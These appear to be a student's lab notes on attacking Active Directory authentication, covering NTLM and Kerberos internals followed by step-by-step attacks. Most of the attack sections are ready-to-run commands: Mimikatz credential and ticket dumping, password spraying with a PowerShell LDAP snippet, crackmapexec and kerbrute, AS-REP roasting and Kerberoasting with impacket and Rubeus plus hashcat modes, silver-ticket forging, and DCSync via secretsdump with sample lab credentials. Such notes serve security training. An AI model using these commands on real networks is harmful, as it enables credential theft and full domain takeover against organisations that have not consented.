Attacking Active Directory Authentication

Understanding Active Directory Authentication

NTLM Authentication

NTLM authentication is used when client auth to a server by IP, or if user auth to hostname that is not registered on the AD DNS

1. pc calculates NTLM hash from the user pass
2. client send username to server
3. server returnnonce / challenge
4. client encrypt nonce using NTLM hash (response)
5. client sents response to server
6. server forward response, username and nonce to domain controller
7. domain contoller encrypt nonce with NTLM hash of the usernmae and compare to respinse it recieved from the server

NTLM is not reversable but it is fast hashing so it can be cracked faster

even with NTLM weakness, blocking and disabling NTLM is unrealistic as it's a fallback third party applications use


Kerberos Authentication

Kerberos Authentication Protocol by Microsoft is from Kerberos version 5 by MIT

it's in user since windows server 2003

Windows based kerberos auth uses a ticket system

NTLM auth: client start auth process with application server
Kerberos client authentication: domain contoller as Key Distribution Center

client starts auth process with KDC not app server

KDC service runs on each domain controller and is responsible for session tickets and temporary session keys to users and computers

1. user logs in to workstation
2. workstation send Authentication Server Request to domain controller
note that domain controller maintains authentication server service
3. AS-REQ: timestamp -> encrypted with hash from password and username
4. domain controller receives request
5. domain controller looks up password hash associated with the user in ntds.dit
6. domain controller decrypt timestamp
if timestamp is not a duplicate process is successful
7. domain controller replies with Uthentication Server Reply (AS-REP)
note that Kerberos is stateless and AS-REP has a session key and a Tiket Granting Ticket (sec+)

session key is encrypted using user password hash and may be decrypted by the client and reused

TGT hash information of user, domain, timeestamp, IP and session key

Anti temper: TGT is encrypted with secret key: NTLM hash of the krbtgt account known only to KDC
8. once session key and TGT is received by client, KDC consider authentication complete

default TGT lasts for 10 hr, renewal doesn't need the user to re-enter password

when user access resource of domain, it must contact KDC:
1. user construct Ticket Granting Service Request (TGS-REQ) -> current user and a timestamp encrypted with session key, name of resource and encrypted TGT
2. ticket-granting service on KDC receives TGS-REQ, if resource exists, TGT decrypted using the secret key
3. session key is extracted from TGT and used to decrypt username and timestamp

1. TGT valid timestamp
2. username of TGS-REQ == username TGT
3. client IP == TGT IP

if process succeeds:
Ticket Granting Server Reply (TGS-REP) with:
name of service
session key between client and service
service ticket: username and group membership with newly created session key

service ticket service name and session key are encrypted using original session key from the creation of TGT
service ticket is encrypted using password hash if servuce account registered with the service

once KDC auth completes: client with both session key and service ticket, service auth->

1. client send app server Application Request (AQ-REQ)
username, timestamp encrypted with session key of the service ticket and the service ticket itself
2. app server decrypts service ticket using service account password hash -> usernmae and session key
3. app server use session key to decrypt username from AP-REQ
if username matches request accepted
4. before permission granted, server inspects group membership and grants appropriate access


Cached AD Credentials

Microsoft implementation of Kerberos uses SSO, password hash stored somewhere to renew TGT

in modern windows: hashes are stored in Local Security Authority Subsystem Service LSASS memory space

this is the end goal of AD attack:
LSASS process is part of the OS and runs as SYSTEM, we need system or local admin to gain access

we need to start attack with a local privilege escalation in order to get hash

data structures used to stored the hash in memory is not documented, and they are encrypted with LSASS-stored key

Mimikatz

xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.50.75
for demo only

start up mimikatz and do the dump:
privilege::debug
sekurlsa::logonpasswords

types of hashes vary based on functional level of AD
Windows 2003: NTLM only
Windows 2008 <: NTLM and SHA-1
Windows 7 or manual set: WDigest-> mimikatz gives clear text pass

another approach:
Kerberos authentication exploit of TGT and service ticket
we can just go grab the stored tickets in LSASS

need to get a service ticket first:
interact with smb or other serivce

dump tickets with:
sekurlsa::tickets

getting service ticket means only that service is compromised
getting TGT means we can get TGS 

mimikatz can export tickets to hard drive and import tickets to LSASS

Public Key Infrastructure in AD:
AD:: Active Directory Certificate Services (AD CS) to implment PKI
exchange certificates between authed user and service

server is installed as Certificate Authority: it can issue and revoke certificates

we can issue certs for web servers to use HTTPS or to auth user based on certs from CA using Smart Cards

certs may be marked as non-exportable private key, private key of that cert can't be exported even with admin

we can do a mimikatz:
crypto::capi
crypto::cng
making non exportable keys exportable


Performing Attacks on Active Directory Authentication

Password Attacks

bruteforce means account lockout, loud and unstable for prod

we can review domain account policy:
net accounts

focus on Lockout threshold, Lockout observation window

3 kinds of password spay

1. LDAP && ADSI low and slow aginst AD user
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "<username>", "<password>")

if password is correct:
distinguishedName : {DC=corp,DC=com}
Path              : LDAP://DC1.corp.com/DC=corp,DC=com

if wrong:
format-default : The following exception occurred while retrieving member "distinguishedName": "The user name or
password is incorrect.
"
    + CategoryInfo          : NotSpecified: (:) [format-default], ExtendedTypeSystemException
    + FullyQualifiedErrorId : CatchFromBaseGetMember,Microsoft.PowerShell.Commands.FormatDefaultCommand


remember to download at lab CLIENT75:
C:\Tools\Spray-Passwords.ps1
-Pass to test single password
-File to pass a wordlist
-Admin to test admin accounts

2. SMB attack
every auth attempt a full SMB connection must be set up and terminated loud

crackmapexec on kali
crackmapexec smb <targetip> -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success

-u and -p can be list or single

this doesn't examine the domain account policy so need to make sure

3. obtaining TGT
kinit -> obtain and cache kerberos TGT

need username and password

only uses 2 UDP frames to determine if password works

AS-REQ only

kerbrute to automate this

both windows and linux works

.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
for windows version

crackmapexec and krebrute we'll need a list of users, just grab from bloodhound or PowerView


AS-REP Roasting

Kerberos preauthentication (process of the TGT)

without preauthentication attacker could send as-req to DC from any AD user, after getting the AS-REP from DC, attacker can perfrom offline password attack aginst the response

AD user account Do not require Kerberos preauthentication is disabled

it is possible to enable it manually

impacket-GetNPUsers for AS-REP roasting
IP of the domain controller as -dc-ip
name of output file where AS-REP hash will be stored in hashcat format for -outputfile
-requrest to request TGT

impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete

note that domain/user

hashcat --help | grep -i "Kerberos"

AS-REP Roasting on Windows: Rubeus

.\Rubeus.exe asreproast /nowrap
since we're already authed no need to pass anything else

grab the hash and hashcat

sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
best64.rule for this


Kerberoasting

when user wants access to Service Principle Name:
client requests service ticket, DC generates the service ticket
service ticket decrypted and validated by app server

when requesting service ticket from domain controller, no check is performed

checks are performed as second step only when connecting to service

if we known SPN to target, we canrequest service ticket from dc

service ticket is encrypted using SPN password hash
we can decrypt with guessing or brute force -> crack cleartext password of the account

it's done with Rubeus

.\Rubeus.exe kerberoast /outfile:<file to store the TGS-REP>

hashcat -m 13100

using impacket-GetUserSPNs we perform kerberoasting from Linux (when rdp is blocked)
sudo impacket-GetUserSPNs -request -dc-ip <domain controller ip> <domain>/<username>

this targets high priv service account with weak passwords

if SPN runs in computer account, managed service account or group-managed service account, password is randomly generated, complex and 120 char long


Silver Tickets

user and group permissions are ont verified by app in most env on the service ticket

Privileged Account Certificate validation: optional verification process between SPN and Domain Controller, but service applications rarely perform PAC validation

need to collect:
1. SPN password hash (for the service account)
2. Domain SID
3. Target SPN

iwr -UseDefaultCredentials http://<service>
for example:
iwr -UseDefaultCredentials http://web04
use to check if current user has access to resource

to show all content:
(iwr -UseDefaultCredentials http://web04).Content

Mimikatz for the SPN password hash

privilege::debug
sekurlsa::logonpasswords

and grab the NTLM one

domain SID:
whoami /user
for the SID of the current user

kerberos::golden /sid:<SID> /domain:<domain> /ptt /target:<target> /service:<service type> /rc4:<NTLM> /user:<username>
example:
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin

note that sid looks like: S-1-5-21-1987370270-658905905-1781884369-1105
ignore -xxxx for this

/sid: for SID
/domain: for domain
/ptt: inject the forged ticket into memory
/target: target address / ip
/serice: http, smb, service type
/rc4: NTLM hash
/user: username

klist
shows tickets

Microsoft created sercurity patch to PAC struct, PAC_REQUESTOR need to be validated by the domain controller, no more forging for non existing user, in place since 2022 Oct 11


Domain Controller Synchronization

Directory Replication Serice: Remote Protocol that uses replication to synchronize redundant domain controller

a controller may request update for object using: IDL_DRSGetNCChanges

the update process doesn't check if request came from a known domain controller

process only verifies SID has correct privilege

we can issue rogue update request to dc from user with certain rights

user neeed: 
Replicating Directory Changes
Replicating Directory Changes All
Replicating Directory Changes in Filtered Set 
rights

members of domain admin, enterprise admin and administrators group has them

use mimikatz && impacket-secretsdump 

jeffadmin :: BrouhahaTungPerorateBroom2023!

in mimikatz:
lsadump::desync /user:<domain>\<user>
lsadump::dcsync /user:corp\dave

grab Hash NTLM
this is m 1000

we can try to do it from kali

impacket-secretsdump -just-dc-user <username> <domain>/<user>:"<password>"@<ip>

impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70

